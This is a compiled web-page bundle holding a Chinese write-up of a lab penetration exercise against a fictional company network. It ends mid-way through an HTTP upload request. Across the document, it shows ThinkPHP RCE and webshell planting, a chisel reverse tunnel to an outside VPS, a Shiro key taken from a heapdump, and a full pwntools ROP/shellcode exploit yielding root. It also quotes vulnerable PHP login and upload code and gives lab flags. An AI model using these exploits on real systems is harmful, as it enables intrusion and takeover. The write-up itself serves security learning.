"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[4474],{6509:(n,e,a)=>{a.r(e),a.d(e,{assets:()=>o,contentTitle:()=>r,default:()=>p,frontMatter:()=>t,metadata:()=>l,toc:()=>c});var s=a(85893),i=a(11151);const t={},r="2024 - GreatWall",l={id:"Yunjing/dimension/GreatWall",title:"2024 - GreatWall",description:"Tags",source:"@site/docs/Yunjing/dimension/2024-GreatWall.md",sourceDirName:"Yunjing/dimension",slug:"/Yunjing/dimension/GreatWall",permalink:"/Target-Machines-WriteUp/docs/Yunjing/dimension/GreatWall",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Yunjing/dimension/2024-GreatWall.md",tags:[],version:"current",sidebarPosition:2024,frontMatter:{},sidebar:"Yunjing_Sidebar",previous:{title:"CVE-2023-51385",permalink:"/Target-Machines-WriteUp/docs/Yunjing/CVE/CVE-2023-51385"},next:{title:"2022 - \u7f51\u9f0e\u676f\u534a\u51b3\u8d5b\u590d\u76d8",permalink:"/Target-Machines-WriteUp/docs/Yunjing/dimension/Wangdingcup"}},o={},c=[{value:"\u5165\u53e3\u70b9\u63a2\u6d4b",id:"\u5165\u53e3\u70b9\u63a2\u6d4b",level:2},{value:"\u5165\u53e3\u70b9 ThinkPHP Webshell",id:"\u5165\u53e3\u70b9-thinkphp-webshell",level:2},{value:"flag - 01",id:"flag---01",level:2},{value:"\u5185\u7f51\u626b\u63cf 172.28.23.0/24",id:"\u5185\u7f51\u626b\u63cf-1722823024",level:2},{value:"172.28.23.0/24 \u5efa\u7acb\u4e2d\u8f6c\u67a2\u7ebd",id:"1722823024-\u5efa\u7acb\u4e2d\u8f6c\u67a2\u7ebd",level:2},{value:"172.28.23.33 Springboot",id:"172282333-springboot",level:2},{value:"172.28.23.33 \u4e8c\u8fdb\u5236\u670d\u52a1\u7a0b\u5e8f\u653b\u51fb",id:"172282333-\u4e8c\u8fdb\u5236\u670d\u52a1\u7a0b\u5e8f\u653b\u51fb",level:2},{value:"flag - 03",id:"flag---03",level:2},{value:"172.28.23.26 \u4fe1\u606f\u6cc4\u9732",id:"172282326-\u4fe1\u606f\u6cc4\u9732",level:2},{value:"172.28.23.26 webshell",id:"172282326-webshell",level:2},{value:"172.28.23.26 \u53cd\u5f39 shell",id:"172282326-\u53cd\u5f39-shell",level:2},{value:"172.28.23.26 Suid \u63d0\u6743",id:"172282326-suid-\u63d0\u6743",level:2},{value:"flag - 02",id:"flag---02",level:2},{value:"172.28.23.26 \u63a2\u6d4b\u73af\u5883",id:"172282326-\u63a2\u6d4b\u73af\u5883",level:2},{value:"172.22.14.0/24 \u53cc\u5c42\u5185\u7f51\u5efa\u7acb\u4e2d\u8f6c\u67a2\u7ebd",id:"1722214024-\u53cc\u5c42\u5185\u7f51\u5efa\u7acb\u4e2d\u8f6c\u67a2\u7ebd",level:2},{value:"\u5185\u7f51\u626b\u63cf 172.22.14.0/24",id:"\u5185\u7f51\u626b\u63cf-1722214024",level:2},{value:"172.22.14.46 Harbor \u955c\u50cf\u6cc4\u9732",id:"172221446-harbor-\u955c\u50cf\u6cc4\u9732",level:2},{value:"flag - 05",id:"flag---05",level:2},{value:"172.22.14.37 Kubernetes",id:"172221437-kubernetes",level:2},{value:"172.22.14.37 Mysql \u5386\u53f2\u8bb0\u5f55",id:"172221437-mysql-\u5386\u53f2\u8bb0\u5f55",level:2},{value:"flag - 04",id:"flag---04",level:2},{value:"172.22.14.37 Mysql UDF \u63d0\u6743",id:"172221437-mysql-udf-\u63d0\u6743",level:2}];function d(n){const e={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.a)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.header,{children:(0,s.jsx)(e.h1,{id:"2024---greatwall",children:"2024 - GreatWall"})}),"\n",(0,s.jsxs)(e.admonition,{type:"info",children:[(0,s.jsx)(e.p,{children:"Tags"}),(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u5185\u7f51\u6e17\u900f"}),"\n"]}),(0,s.jsx)(e.p,{children:"\u9776\u6807\u4ecb\u7ecd"}),(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u5728\u8fd9\u4e2a\u9776\u573a\u4e2d\uff0c\u60a8\u5c06\u626e\u6f14\u4e00\u540d\u6e17\u900f\u6d4b\u8bd5\u5de5\u7a0b\u5e08\uff0c\u63a5\u53d7\u96c7\u4f63\u4efb\u52a1\u6765\u8bc4\u4f30 \u201cSmartLink Technologies Ltd.\u201d \u516c\u53f8\u7684\u7f51\u7edc\u5b89\u5168\u72b6\u51b5\u3002 \u60a8\u7684\u4efb\u52a1\u662f\u9996\u5148\u5165\u4fb5\u8be5\u516c\u53f8\u66b4\u9732\u5728\u516c\u7f51\u4e0a\u7684\u5e94\u7528\u670d\u52a1\uff0c\u7136\u540e\u8fd0\u7528\u540e\u6e17\u900f\u6280\u5de7\u6df1\u5165 SmartLink \u516c\u53f8\u7684\u5185\u90e8\u7f51\u7edc\u3002\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u60a8\u5c06\u5bfb\u627e\u6f5c\u5728\u7684\u5f31\u70b9\u548c\u6f0f\u6d1e\uff0c\u5e76\u9010\u4e00\u63a5\u7ba1\u6240\u6709\u670d\u52a1\uff0c\u4ece\u800c\u63a7\u5236\u6574\u4e2a\u5185\u90e8\u7f51\u7edc\u3002\u9776\u573a\u4e2d\u5171\u8bbe\u7f6e\u4e86 6 \u4e2a Flag\uff0c\u5b83\u4eec\u5206\u5e03\u5728\u4e0d\u540c\u7684\u9776\u673a\u4e0a\uff0c\u60a8\u9700\u8981\u627e\u5230\u5e76\u83b7\u53d6\u8fd9\u4e9b Flag \u4f5c\u4e3a\u60a8\u7684\u6210\u5c31\u76ee\u6807\u3002"}),"\n"]})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintext",metastring:'title="\u5165\u53e3\u70b9"',children:"8.130.110.24\n"})}),"\n",(0,s.jsx)(e.h2,{id:"\u5165\u53e3\u70b9\u63a2\u6d4b",children:"\u5165\u53e3\u70b9\u63a2\u6d4b"}),"\n",(0,s.jsxs)(e.p,{children:["\u76f4\u63a5\u4f7f\u7528 ",(0,s.jsx)(e.code,{children:"fscan"})," \u8fdb\u884c\u626b\u63cf\u63a2\u6d4b"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:'start infoscan\n8.130.110.24:8080 open\n8.130.110.24:22 open\n8.130.110.24:80 open\n[*] alive ports len is: 3\nstart vulscan\n[*] WebTitle http://8.130.110.24      code:200 len:10887  title:""\n[*] WebTitle http://8.130.110.24:8080 code:200 len:1027   title:Login Form\n[+] PocScan http://8.130.110.24:8080 poc-yaml-thinkphp5023-method-rce poc1\n'})}),"\n",(0,s.jsx)(e.h2,{id:"\u5165\u53e3\u70b9-thinkphp-webshell",children:"\u5165\u53e3\u70b9 ThinkPHP Webshell"}),"\n",(0,s.jsxs)(e.p,{children:["\u53d1\u73b0 ",(0,s.jsx)(e.code,{children:"http://8.130.110.24:8080"})," \u670d\u52a1\u5b58\u5728\u6709 ThinkPHP \u76f4\u63a5 RCE \u6f0f\u6d1e\uff0c\u5c1d\u8bd5\u5229\u7528"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(17116).Z+"",width:"1474",height:"1097"})}),"\n",(0,s.jsx)(e.p,{children:"\u5b58\u5728\u6709\u4ee5\u4e0b\u5229\u7528 payload"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintext",children:"[+] \u76ee\u6807\u5b58\u5728 tp5_construct_code_exec_2 \u6f0f\u6d1e\n[+] \u76ee\u6807\u5b58\u5728 tp5_construct_code_exec_1 \u6f0f\u6d1e\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u547d\u4ee4\u6267\u884c\uff0c\u53d1\u73b0\u65e0\u56de\u663e"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(42953).Z+"",width:"1474",height:"1097"})}),"\n",(0,s.jsx)(e.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u5199\u5165 webshell"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(89661).Z+"",width:"1474",height:"1097"})}),"\n",(0,s.jsx)(e.p,{children:"\u7136\u540e\u5229\u7528\u8681\u5251\u5efa\u7acb\u8fde\u63a5"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(78044).Z+"",width:"1542",height:"1040"})}),"\n",(0,s.jsx)(e.p,{children:"\u6210\u529f\u690d\u5165 webshell"}),"\n",(0,s.jsx)(e.h2,{id:"flag---01",children:"flag - 01"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintext",children:"flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"\u5185\u7f51\u626b\u63cf-1722823024",children:"\u5185\u7f51\u626b\u63cf 172.28.23.0/24"}),"\n",(0,s.jsxs)(e.p,{children:["\u4e0a\u4f20 ",(0,s.jsx)(e.code,{children:"fscan"})," \u5230\u5165\u53e3\u70b9\u9776\u673a\u4e4b\u540e\uff0c\u67e5\u770b\u7f51\u5361\u4fe1\u606f"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"(remote) www-data@portal:/var/www/html/background/public$ ifconfig\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 172.28.23.17  netmask 255.255.0.0  broadcast 172.28.255.255\n        inet6 fe80::216:3eff:fe04:8b0a  prefixlen 64  scopeid 0x20<link>\n        ether 00:16:3e:04:8b:0a  txqueuelen 1000  (Ethernet)\n        RX packets 54139  bytes 65477946 (65.4 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 16175  bytes 3092855 (3.0 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 712  bytes 67453 (67.4 KB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 712  bytes 67453 (67.4 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u4f7f\u7528 ",(0,s.jsx)(e.code,{children:"fscan"})," \u8fdb\u884c\u626b\u63cf"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",metastring:'title="172.28.23.0/24"',children:'start infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 172.28.23.17    is alive\n(icmp) Target 172.28.23.26    is alive\n(icmp) Target 172.28.23.33    is alive\n[*] Icmp alive hosts len is: 3\n172.28.23.33:8080 open\n172.28.23.17:8080 open\n172.28.23.26:80 open\n172.28.23.33:22 open\n172.28.23.26:22 open\n172.28.23.17:80 open\n172.28.23.17:22 open\n172.28.23.26:21 open\n[*] alive ports len is: 8\nstart vulscan\n[*] WebTitle http://172.28.23.17       code:200 len:10887  title:""\n[*] WebTitle http://172.28.23.17:8080  code:200 len:1027   title:Login Form\n[*] WebTitle http://172.28.23.26       code:200 len:13693  title: \u65b0\u7fd4 OA \u7ba1\u7406\u7cfb\u7edf - OA \u7ba1\u7406\u5e73\u53f0\u8054\u7cfb\u7535\u8bdd\uff1a13849422648 \u5fae\u4fe1\u540c\u53f7\uff0cQQ958756413\n[+] ftp 172.28.23.26:21:anonymous\n   [->]OASystem.zip\n[*] WebTitle http://172.28.23.33:8080  code:302 len:0      title:None \u8df3\u8f6c url: http://172.28.23.33:8080/login;jsessionid=363B8F8B96F639A14C8B7F4646D27459\n[*] WebTitle http://172.28.23.33:8080/login;jsessionid=363B8F8B96F639A14C8B7F4646D27459 code:200 len:3860   title: \u667a\u8054\u79d1\u6280 ERP \u540e\u53f0\u767b\u9646\n[+] PocScan http://172.28.23.17:8080 poc-yaml-thinkphp5023-method-rce poc1\n[+] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file\n[+] PocScan http://172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2\n'})}),"\n",(0,s.jsx)(e.h2,{id:"1722823024-\u5efa\u7acb\u4e2d\u8f6c\u67a2\u7ebd",children:"172.28.23.0/24 \u5efa\u7acb\u4e2d\u8f6c\u67a2\u7ebd"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",metastring:'title="vps"',children:"root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse &\nroot@jmt-projekt:~# 2024/08/16 10:58:03 server: Reverse tunnelling enabled\n2024/08/16 10:58:03 server: Fingerprint D9Wm+jW4SsG7MFgviTnkO7s3S7aNEYPubfsRa+k9pBM=\n2024/08/16 10:58:03 server: Listening on http://0.0.0.0:1337\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u7136\u540e\u5c06 ",(0,s.jsx)(e.code,{children:"chisel_1.9.1_linux_amd64"})," \u4f20\u8f93\u5230\u5165\u53e3\u70b9\u9776\u673a\u4e4b\u540e\uff0c\u6267\u884c\u8fde\u63a5"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",metastring:'title="\u5165\u53e3\u70b9"',children:"(remote) www-data@portal:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 R:0.0.0.0:10000:socks &\n2024/08/16 10:59:36 client: Connecting to ws://139.*.*.*:1337\n2024/08/16 10:59:36 client: Connected (Latency 46.289192ms)\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u6210\u529f\u5efa\u7acb socks \u4ee3\u7406"}),"\n",(0,s.jsx)(e.h2,{id:"172282333-springboot",children:"172.28.23.33 Springboot"}),"\n",(0,s.jsxs)(e.p,{children:["\u6839\u636e ",(0,s.jsx)(e.code,{children:"fscan"})," \u7684\u626b\u63cf\u7ed3\u679c\uff0c\u5b58\u5728\u6709 ",(0,s.jsx)(e.code,{children:"poc-yaml-spring-actuator-heapdump-file"})," \u4fe1\u606f\u6cc4\u9732\uff0c\u5c1d\u8bd5\u83b7\u53d6"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ proxychains4 wget http://172.28.23.33:8080/actuator/heapdump\n......\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ java -jar ./tools/JDumpSpider-1.1-SNAPSHOT-full.jar ./heapdump\n......\nCookieRememberMeManager(ShiroKey)\n-------------\nalgMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u5728 heapdump \u6587\u4ef6\u4e2d\u83b7\u53d6\u5230\u4e86 Shiro \u6846\u67b6\u7684 key \u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u6267\u884c\u53cd\u5e8f\u5217\u5316 RCE"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(57757).Z+"",width:"1504",height:"1247"})}),"\n",(0,s.jsx)(e.p,{children:"\u5c1d\u8bd5\u5199\u5165 webshell"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(83302).Z+"",width:"1504",height:"1247"})}),"\n",(0,s.jsx)(e.p,{children:"\u5c1d\u8bd5\u8fde\u63a5"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(6058).Z+"",width:"1544",height:"1042"})}),"\n",(0,s.jsx)(e.p,{children:"\u6210\u529f getshell"}),"\n",(0,s.jsx)(e.h2,{id:"172282333-\u4e8c\u8fdb\u5236\u670d\u52a1\u7a0b\u5e8f\u653b\u51fb",children:"172.28.23.33 \u4e8c\u8fdb\u5236\u670d\u52a1\u7a0b\u5e8f\u653b\u51fb"}),"\n",(0,s.jsx)(e.p,{children:"\u5c1d\u8bd5\u63a2\u6d4b\u76ee\u6807\u9776\u673a\u7684\u6240\u6709\u670d\u52a1"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(2247).Z+"",width:"1544",height:"1042"})}),"\n",(0,s.jsxs)(e.p,{children:["\u5c1d\u8bd5\u8fde\u63a5\u4f4d\u4e8e ",(0,s.jsx)(e.code,{children:"59696"})," \u7aef\u53e3\u7684\u670d\u52a1"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ proxychains4 nc 172.28.23.33 59696\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  139.*.*.*:10000  ...  172.28.23.33:59696  ...  OK\nConnection established!\nServer time: Fri Aug 16 11:26:17 2024\n\nUsername: 123\nPassword: 123\n\nUnauthorized\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u6000\u7591\u662f\u4e8c\u8fdb\u5236 pwn \u653b\u51fb\uff0c\u5b9a\u4f4d\u5230\u670d\u52a1\u4f4d\u4e8e ",(0,s.jsx)(e.code,{children:"/home/ops01/HashNote"})," \u6587\u4ef6\uff08\u65e0\u6cd5\u4f7f\u7528 ",(0,s.jsx)(e.code,{children:"lsof"})," \u6216\u8005 ",(0,s.jsx)(e.code,{children:"ss"})," \u8fdb\u884c\u5b9a\u4f4d\uff0c\u56e0\u4e3a\u6743\u9650\u4e0d\u8db3\uff09"]}),"\n",(0,s.jsx)(e.p,{children:"\u8fd9\u4e5f\u8bf4\u660e\u8fd9\u4e2a\u670d\u52a1\u662f\u4ee5 root \u6743\u9650\u8fd0\u884c\u7684\uff0c\u5982\u679c\u501f\u52a9 pwn \u653b\u51fb\u62ff\u4e0b\u670d\u52a1\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u83b7\u5f97 root \u6743\u9650"}),"\n",(0,s.jsx)(e.p,{children:"\u5c06\u7a0b\u5e8f\u4e0b\u8f7d\u5230\u672c\u5730\u8fdb\u884c\u5206\u6790\u4e4b\u540e\uff0c\u7f16\u5199\u653b\u51fb\u811a\u672c"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:"from pwn import *\n\nelf = ELF('./HashNote')\ncontext(arch=elf.arch, os='linux', log_level='debug')\n# p = process('./HashNote')\n\np = remote('172.28.23.33', 59696)\n\ndef send_command(command):\n    p.sendlineafter(b':', str(command))\n\ndef add_entry(key, value):\n    send_command(1)\n    p.sendlineafter(b'Key:', key)\n    p.sendlineafter(b'Data:', value)\n\ndef get_entry(key):\n    send_command(2)\n    p.sendlineafter(b'Key:', key)\n\ndef update_entry(key, value):\n    send_command(3)\n    p.sendlineafter(b'Key:', key)\n    p.sendlineafter(b'Data:', value)\n\ndef set_username(value):\n    send_command(4)\n    p.sendafter(b'New username:', value)\n\n# Authenticate\np.sendlineafter(b'Username:', b'123')\np.sendlineafter(b'Password:', b'freep@ssw0rd:3')\n\n# Add entries to setup the environment\nadd_entry(b'aabP', b'aaaaaaaa')\nadd_entry(b'aace', b'C' * 0xc0)\n\n# Shellcode to spawn a shell\nsc = [\n    b'\\x6a\\x3b',                   # push   0x3b\n    b'\\x58',                       # pop    rax\n    b'\\x99',                       # cdq\n    b'\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68', # movabs rbx, 0x68732f6e69622f2f\n    b'\\x53',                       # push   rbx\n    b'\\x48\\x89\\xe7',               # mov    rdi, rsp\n    b'\\x52',                       # push   rdx\n    b'\\x57',                       # push   rdi\n    b'\\x48\\x89\\xe6',               # mov    rsi, rsp\n    b'\\x0f\\x05'                    # syscall\n]\nshellcode = b''.join(sc)\nusername_addr = 0x5dc980\nfake_obj_addr = username_addr + 0x10\n\ndef arbitrary_read(addr):\n    payload = p64(fake_obj_addr)\n    payload += p64(0xdeadbeef)\n\n    fake_obj = p64(fake_obj_addr + 0x10) + p64(4)\n    fake_obj += b'aahO'.ljust(0x10, b'\\x00')\n    fake_obj += p64(addr) + p64(8) + b'aaaaaaaa'\n\n    payload += fake_obj\n    payload += shellcode\n    payload = payload.ljust(128, b'\\x00')\n    set_username(payload)\n    get_entry(b'aahO')\n\ndef arbitrary_write(addr, data):\n    payload = p64(fake_obj_addr)\n    payload += p64(0xdeadbeef)\n\n    fake_obj = p64(fake_obj_addr + 0x10) + p64(4)\n    fake_obj += b'aahO'.ljust(0x10, b'\\x00')\n    fake_obj += p64(addr) + p64(len(data)) + b'aaaaaaaa'\n\n    payload += fake_obj\n    payload += shellcode\n    payload = payload.ljust(128, b'\\x00')\n    set_username(payload)\n    update_entry(b'aahO', data)\n\n# Leak the stack address\nenviron = 0x5e4c38\narbitrary_read(environ)\nstack_addr = u64((p.recvuntil(b'\\x7f', drop=False)[-6:].ljust(8, b'\\0')))\nsuccess('stack_addr', stack_addr)\n\n# ROP gadgets\nrdi = 0x0000000000405e7c\nrsi = 0x000000000040974f\nrax = 0x00000000004206ba\nrdx_rbx = 0x000000000053514b\nshr_eax_2 = 0x0000000000523f2e\nsyscall_ret = 0x00000000004d9776\n\n# ROP payload to map memory and jump to shellcode\npayload = p64(rdi) + p64(username_addr & ~0xfff) + p64(rsi) + p64(0x1000) + p64(rdx_rbx) + p64(7) + p64(0) + p64(rax) + p64(0xa << 2) + p64(shr_eax_2) + p64(syscall_ret) + p64(username_addr + 0x48)\n\narbitrary_write(stack_addr - 0x210, payload)\np.sendline(b'uname -ar')\n\np.interactive()\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u501f\u52a9 ",(0,s.jsx)(e.code,{children:"proxychains"})," \u5c06 python \u811a\u672c\u4ee3\u7406\u5230\u5185\u7f51\u4e2d\u7684\u9776\u673a"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(env)(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ proxychains4 python3 pwn-exploit.py\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[*] '/home/randark/tmp/HashNote'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    SHSTK:      Enabled\n    IBT:        Enabled\n[O] Opening connection to 172.28.23.33 on port 59696: Trying 172.28.23.33  [o]\n[+] Opening connection to 172.28.23.33 on port 59696: Done\n......\n$ whoami\n[DEBUG] Sent 0x7 bytes:\n    b'whoami\\n'\n[DEBUG] Received 0x5 bytes:\n    b'root\\n'\nroot\n"})}),"\n",(0,s.jsx)(e.h2,{id:"flag---03",children:"flag - 03"}),"\n",(0,s.jsxs)(e.p,{children:["\u5728\u501f\u52a9\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u62ff\u5230 root shell \u4e4b\u540e\uff0c\u5728 ",(0,s.jsx)(e.code,{children:"/root"})," \u76ee\u5f55\u4e2d\u53ef\u4ee5\u627e\u5230 flag"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintext",children:"flag{6a326f94-6526-4586-8233-152d137281fd}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"172282326-\u4fe1\u606f\u6cc4\u9732",children:"172.28.23.26 \u4fe1\u606f\u6cc4\u9732"}),"\n",(0,s.jsx)(e.p,{children:"\u5c1d\u8bd5\u8bbf\u95ee"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(96560).Z+"",width:"1577",height:"1140"})}),"\n",(0,s.jsx)(e.p,{children:"\u9996\u5148\u5c1d\u8bd5\u76ee\u5f55\u626b\u63cf"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ dirsearch --proxy socks5://139.*.*.*:10000 -u http://172.28.23.26 -i 200\n......\n[14:13:56] Starting:\n[14:14:00] 200 -    6KB - /.DS_Store\n[14:14:40] 200 -    0B  - /checklogin.php\n[14:14:47] 200 -    3B  - /db.php\n[14:14:49] 200 -  532B  - /download/\n[14:15:09] 200 -  722B  - /manage/\n[14:15:42] 200 -  527B  - /system/\n[14:15:47] 200 -   61B  - /upfile.php\n[14:15:47] 200 -  546B  - /upload/\n[14:15:47] 200 -   50B  - /upload.php\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u672a\u53d1\u73b0\u5b58\u5728\u6709\u53ef\u5229\u7528\u70b9"}),"\n",(0,s.jsxs)(e.p,{children:["\u7ed3\u5408 ",(0,s.jsx)(e.code,{children:"fscan"})," \u626b\u63cf\u5f97\u5230\u7684 ",(0,s.jsx)(e.code,{children:"ftp 172.28.23.26:21:anonymous"})," \u8bb0\u5f55\u6765\u770b\uff0c\u53ef\u80fd ftp \u5b58\u5728\u6709\u4fe1\u606f\u6cc4\u9732"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ proxychains4 ftp anonymous@172.28.23.26 21\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  139.*.*.*:10000  ...  172.28.23.26:21  ...  OK\nConnected to 172.28.23.26.\n220 (vsFTPd 3.0.3)\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n229 Entering Extended Passive Mode (|||10835|)\n[proxychains] Strict chain  ...  139.*.*.*:10000  ...  172.28.23.26:10835  ...  OK\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0         7536672 Mar 23 23:56 OASystem.zip\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u5c06 ",(0,s.jsx)(e.code,{children:"OASystem.zip"})," \u6587\u4ef6\u4e0b\u8f7d\u4e0b\u6765\u4e4b\u540e\uff0c\u5728\u5176\u4e2d\u53d1\u73b0 OA \u7cfb\u7edf\u7684\u6e90\u7801"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(71641).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.p,{children:"\u5bf9\u6e90\u7801\u8fdb\u884c\u5ba1\u8ba1\uff0c\u53d1\u73b0\u767b\u5f55\u903b\u8f91\u5b58\u5728\u6709\u6f0f\u6d1e"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-php",metastring:'title="checklogin.php"',children:"<?php\nfunction islogin(){\n    if(isset($_COOKIE['id'])&&isset($_COOKIE['loginname'])&&isset($_COOKIE['jueseid'])&&isset($_COOKIE['danweiid'])&&isset($_COOKIE['quanxian'])){\n        if($_COOKIE['id']!=''&&$_COOKIE['loginname']!=''&&$_COOKIE['jueseid']!=''&&$_COOKIE['danweiid']!=''&&$_COOKIE['quanxian']!=''){\n            return true;\n        }\n        else {\n            return false;\n        }\n    }\n    else {\n        return false;\n    }\n}\n?>\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u53ef\u4ee5\u53d1\u73b0\uff0c\u53ea\u9700\u8981\u5c06\u51e0\u4e2a ",(0,s.jsx)(e.code,{children:"_COOKIE"})," \u5c5e\u6027\u7684\u503c\u4e0d\u4e3a\u7a7a\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fc7\u767b\u5f55"]}),"\n",(0,s.jsx)(e.p,{children:"\u540c\u65f6\uff0c\u53d1\u73b0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u7684\u6f0f\u6d1e"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-php",metastring:'title="uploadbase64.php"',children:'<?php\n$img = $_POST[\'imgbase64\'];\nif (preg_match(\'/^(data:\\s*image\\/(\\w+);base64,)/\', $img, $result)) {\n    $type = ".".$result[2];\n    $path = "upload/" . date("Y-m-d") . "-" . uniqid() . $type;\n}\n$img =  base64_decode(str_replace($result[1], \'\', $img));\n@file_put_contents($path, $img);\nexit(\'{"src":"\'.$path.\'"}\');\n'})}),"\n",(0,s.jsx)(e.p,{children:"\u53ef\u4ee5\u76f4\u63a5\u5c1d\u8bd5\u5229\u7528"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintext",children:"POST /uploadbase64.php HTTP/1.1\nHost: 172.28.23.26\nAccept-Language: zh-CN\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 